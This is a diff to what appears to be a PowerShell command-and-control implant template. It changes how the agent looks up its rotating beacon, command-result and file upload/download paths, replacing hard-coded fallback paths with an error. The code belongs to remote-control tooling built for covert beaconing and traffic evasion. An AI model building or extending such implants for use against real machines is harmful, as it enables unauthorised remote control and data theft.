@@ -8,8 +8,8 @@ $global:rotationInterval = {{ROTATION_INTERVAL}}
 $global:initialPaths = @{
     "beacon_path" = "{{BEACON_PATH}}";
     "cmd_result_path" = "{{CMD_RESULT_PATH}}";
-    "file_request_path" = "{{FILE_REQUEST_PATH}}";  # Added proper template variable
-    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";    # Added proper template variable
+    "file_request_path" = "{{FILE_REQUEST_PATH}}";
+    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";
 }
 
 # Store current paths
@@ -46,21 +46,26 @@ function Update-PathRotation {
 function Get-CurrentPath {
     param([string]$PathType)
     
+    # First look in current paths (rotated)
     if ($global:currentPaths.ContainsKey($PathType)) {
-        return $global:currentPaths[$PathType]
+        $path = $global:currentPaths[$PathType]
+        if (-not [string]::IsNullOrEmpty($path)) {
+            Write-Verbose "Using current path for ${PathType}: $path"
+            return $path
+        }
     }
     
-    # Fallback to initial paths if not found
+    # Then try initial paths
     if ($global:initialPaths.ContainsKey($PathType)) {
-        return $global:initialPaths[$PathType]
+        $path = $global:initialPaths[$PathType]
+        if (-not [string]::IsNullOrEmpty($path)) {
+            Write-Verbose "Using initial path for ${PathType}: $path"
+            return $path
+        }
     }
     
-    # Default fallback paths
-    switch ($PathType) {
-        "beacon_path" { return "/beacon" }
-        "cmd_result_path" { return "/command_result" }
-        "file_request_path" { return "/file_request" }
-        "file_upload_path" { return "/file_upload" }
-        default { return "/$PathType" }
-    }
+    # If we get here, we don't have a valid path - throw error instead of using fallbacks
+    $errorMsg = "ERROR: No valid path found for '${PathType}'. Dynamic path rotation requires all paths."
+    Write-Host $errorMsg
+    throw $errorMsg
 }
